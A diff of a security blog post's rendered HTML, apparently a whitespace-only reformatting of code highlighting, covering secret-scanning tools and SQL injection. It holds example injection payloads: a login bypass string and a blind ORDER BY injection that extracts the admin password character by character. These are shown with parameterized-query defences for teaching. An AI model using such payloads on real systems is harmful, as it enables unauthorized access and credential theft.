+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'--baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;'.secrets.baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nt"&gt;exclude&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;.*/tests/.*&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Then execute pre-commit install and you&amp;rsquo;re done 🙂&lt;/p&gt;
 &lt;p&gt;Yelps &lt;a href="https://github.com/Yelp/detect-secrets"&gt;&lt;strong&gt;detect-secrets&lt;/strong&gt;&lt;/a&gt; tries to find secrets in source code by finding high-entropy strings and the others look for common file formats/strings.&lt;/p&gt;
@@ -1793,20 +1793,20 @@ layer (DAL) that takes care of the escaping.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# You can also go to&lt;/span&gt;
 &lt;span class="c1"&gt;# [https://github.com/zricethezav/gitleaks/releases](https://github.com/zricethezav/gitleaks/releases)&lt;/span&gt;
 &lt;span class="c1"&gt;# and download the version you need in the browser&lt;/span&gt;
-$ wget &lt;span class="o"&gt;[&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;](&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;)&lt;/span&gt;
+$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;](&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;)&lt;/span&gt;
 
-$ mv gitleaks-linux-amd64 gitleaks
-$ chmod +x gitleaks
-$ sudo mv gitleaks /usr/local/bin/
+$&lt;span class="w"&gt; &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;gitleaks-linux-amd64&lt;span class="w"&gt; &lt;/span&gt;gitleaks
+$&lt;span class="w"&gt; &lt;/span&gt;chmod&lt;span class="w"&gt; &lt;/span&gt;+x&lt;span class="w"&gt; &lt;/span&gt;gitleaks
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;gitleaks&lt;span class="w"&gt; &lt;/span&gt;/usr/local/bin/
 
-$ &lt;span class="nb"&gt;cd&lt;/span&gt; your-repo
-$ gitleaks --repo&lt;span class="o"&gt;=&lt;/span&gt;. -v
-INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt; cloning... .
-Enumerating objects: &lt;span class="m"&gt;115&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
-Counting objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;/115&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
-Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;42&lt;/span&gt;/42&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
-Total &lt;span class="m"&gt;115&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;115&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
-INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt; No leaks detected. &lt;span class="m"&gt;29&lt;/span&gt; commits scanned in &lt;span class="m"&gt;111&lt;/span&gt; milliseconds &lt;span class="m"&gt;984&lt;/span&gt; microseconds
+$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;your-repo
+$&lt;span class="w"&gt; &lt;/span&gt;gitleaks&lt;span class="w"&gt; &lt;/span&gt;--repo&lt;span class="o"&gt;=&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;-v
+INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;cloning...&lt;span class="w"&gt; &lt;/span&gt;.
+Enumerating&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
+Counting&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;/115&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
+Compressing&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;42&lt;/span&gt;/42&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
+Total&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;delta&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;reused&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;delta&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;leaks&lt;span class="w"&gt; &lt;/span&gt;detected.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;commits&lt;span class="w"&gt; &lt;/span&gt;scanned&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;111&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;milliseconds&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;984&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;microseconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;&lt;a href="https://github.com/streaak/keyhacks#AWS-Access-Key-ID-and-Secret"&gt;&lt;strong&gt;Keyhacks&lt;/strong&gt;&lt;/a&gt; is a project which shows you if leaked keys are still valid and what an attacker could do with them.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://haveibeenpwned.com/"&gt;&lt;strong&gt;HaveIbeenPwned&lt;/strong&gt;&lt;/a&gt; is interesting for your private accounts. You can register and will receive an email if your email appears in a data leak. It happens so often 😱 For this reason: &lt;strong&gt;Don&amp;rsquo;t re-use passwords! A re-used password is a leaked password!&lt;/strong&gt;&lt;/p&gt;
@@ -1860,16 +1860,16 @@ packages simply send the hostname with environment variables to a server (&lt;a 
 &lt;p&gt;In the worst case, the attacker steals the data and sells it. After that, they corrupt your data in a way that you don&amp;rsquo;t fix it / use the backups.&lt;/p&gt;
 &lt;h2 id="how-are-sql-injection-attacks-executed"&gt;How are SQL injection attacks executed?&lt;/h2&gt;
 &lt;p&gt;Imagine you have a website with a login form. Leaving some important bells and whistles away, something like this happens:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
-&lt;span class="k"&gt;FROM&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;
-&lt;span class="k"&gt;WHERE&lt;/span&gt;  &lt;span class="k"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**[username]**'&lt;/span&gt;
-       &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**[password]**'&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**[username]**'&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**[password]**'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;The attacker can change the username to admin' OR '1'='1 which then gives the query:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
-&lt;span class="k"&gt;FROM&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;
-&lt;span class="k"&gt;WHERE&lt;/span&gt;  &lt;span class="k"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**admin'&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="s1"&gt;'1'&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'1**'&lt;/span&gt;
-       &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'secret'&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**admin'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;OR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'1'&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'1**'&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'secret'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This means the query will look for two conditions:&lt;/p&gt;
 &lt;ul&gt;
@@ -1886,7 +1886,7 @@ packages simply send the hostname with environment variables to a server (&lt;a 
 
 &lt;span class="c1"&gt;# Create a connection conn&lt;/span&gt;
 &lt;span class="n"&gt;stmt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="sd"&gt;"""SELECT * FROM users&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""SELECT * FROM users&lt;/span&gt;
 &lt;span class="sd"&gt;               WHERE user = :username AND password = :password"""&lt;/span&gt;
 &lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stmt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prams&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;"user"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"foo"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"bar"&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
@@ -1932,18 +1932,18 @@ a defense-in-depth perspective.&lt;/p&gt;
 &lt;h3 id="order-by"&gt;Order By&lt;/h3&gt;
 &lt;p&gt;You might be tempted to think that the following SQL query is secure because
 the user input is just in the ORDER BY clause:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;book_title&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;books&lt;/span&gt; &lt;span class="k"&gt;ORDER&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;book_title&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;books&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;where the developer expects &lt;code&gt;user_input&lt;/code&gt; to be either &lt;code&gt;sales&lt;/code&gt; or
 &lt;code&gt;average_review&lt;/code&gt;. However, an attacker could change &lt;code&gt;user_input&lt;/code&gt; to this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CASE&lt;/span&gt; &lt;span class="k"&gt;WHEN&lt;/span&gt;
-    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;
-     &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;"admin"&lt;/span&gt;
-         &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="k"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;"a"&lt;/span&gt;
-     &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
-     &lt;span class="k"&gt;THEN&lt;/span&gt; &lt;span class="n"&gt;sales&lt;/span&gt;
-     &lt;span class="k"&gt;ELSE&lt;/span&gt; &lt;span class="n"&gt;average_review&lt;/span&gt;
-&lt;span class="k"&gt;END&lt;/span&gt; &lt;span class="k"&gt;ASC&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CASE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHEN&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;"admin"&lt;/span&gt;
+&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;"a"&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;THEN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sales&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;ELSE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;average_review&lt;/span&gt;
+&lt;span class="k"&gt;END&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ASC&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This way the attacker can get the password hash of the admin user. Character by
 character. Just by looking at how the sorting changes.&lt;/p&gt;
